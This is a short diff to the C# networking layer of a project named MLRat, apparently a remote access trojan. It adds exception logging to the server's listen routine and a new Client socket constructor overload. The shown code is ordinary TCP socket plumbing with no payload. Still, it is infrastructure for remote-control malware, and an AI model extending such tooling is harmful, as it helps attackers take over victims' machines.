@@ -78,7 +78,6 @@ namespace MLRat.Networking
             {
                 _globalSocket = new Socket(SocketaddressFamily, SocketType.Stream, ProtocolType.Tcp);
             }
-
             #endregion
 
             #region " Functions "
@@ -92,10 +91,12 @@ namespace MLRat.Networking
                     _globalSocket.Bind(new IPEndPoint(IPAddress.Any, port));
                     _globalSocket.Listen(5);
                     _globalSocket.BeginAccept(AcceptCallback, null);
+                    
                     IsRunning = true;
                 }
-                catch
+                catch(Exception ex)
                 {
+                    Console.WriteLine(ex.Message);
                     IsRunning = false;
                 }
                 return IsRunning;
@@ -364,6 +365,12 @@ namespace MLRat.Networking
             {
                 _globalSocket = new Socket(SocketAddressFamily, SocketType.Stream, ProtocolType.Tcp);
             }
+            public Client(AddressFamily SocketAddressFamily, ProtocolType pType, SocketType sType)
+                : this()
+            {
+                _globalSocket = new Socket(SocketAddressFamily, sType, pType);
+            }
+
 
             #endregion"
 
